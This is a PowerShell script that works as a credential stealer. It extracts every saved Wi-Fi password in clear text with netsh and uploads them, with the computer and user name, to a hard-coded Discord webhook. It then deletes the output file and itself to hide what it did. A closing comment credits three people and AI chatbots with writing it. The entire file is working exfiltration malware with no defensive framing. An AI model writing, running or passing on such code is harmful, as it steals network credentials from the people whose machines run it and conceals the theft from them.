$discordWebhookUrl = 'https://discord.com/api/webhooks/1431426274428977193/81wq62g5M9t47PwGnH4ZK6ZBJKM8aPrOxmn89SJK2t5edM23F3djYG0x3InvdPYGMK_2'

$documents = [Environment]::GetFolderPath('MyDocuments')
$Output = Join-Path $documents 'WiFiPasswords.txt'

"Wi-Fi passwords collected on $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File $Output -Encoding UTF8 -Force

$profiles = (netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { ($_ -replace '.*:\s*','').Trim() }

foreach ($p in $profiles) {
    $res = netsh wlan show profile name="$p" key=clear 2>$null
    $pwdLine = $res | Select-String 'Key Content'
    $pwd = if ($pwdLine) { ($pwdLine -replace '.*:\s*','').Trim() } else { '<No password found or requires elevation>' }
    "Profile: $p`nPassword: $pwd`n---`n" | Out-File $Output -Append -Encoding UTF8 -Force
}

Add-Type -AssemblyName System.Net.Http
$fileBytes = [System.IO.File]::ReadAllBytes($Output)
$ms = New-Object System.IO.MemoryStream(,$fileBytes)
$fileContent = New-Object System.Net.Http.StreamContent($ms)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('application/octet-stream')

$handler = New-Object System.Net.Http.HttpClientHandler
$handler.AllowAutoRedirect = $true
$client = New-Object System.Net.Http.HttpClient($handler)
$multipart = New-Object System.Net.Http.MultipartFormDataContent

$multipart.Add( (New-Object System.Net.Http.StringContent $env:COMPUTERNAME), 'hostname' )
$multipart.Add( (New-Object System.Net.Http.StringContent $env:USERNAME), 'username' )
$multipart.Add( (New-Object System.Net.Http.StringContent (Get-Date -Format o)), 'timestamp' )
$multipart.Add($fileContent, 'file', (Split-Path $Output -Leaf))

$response = $client.PostAsync($discordWebhookUrl, $multipart).GetAwaiter().GetResult()

if ($response.StatusCode.Value__ -eq 204 -or $response.StatusCode.Value__ -eq 200) {
    Remove-Item $Output -Force -ErrorAction SilentlyContinue
}

# Self-delete after successful execution
Start-Sleep -Seconds 2  # Brief buffer for any lingering I/O
Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
$multipart.Dispose()
$client.Dispose()
$handler.Dispose()
$ms.Dispose()

# Prepared with care by Christian Taylor, Joshua Macian, and Benjamin Petrini, with the assistance of ChatGPT and Grok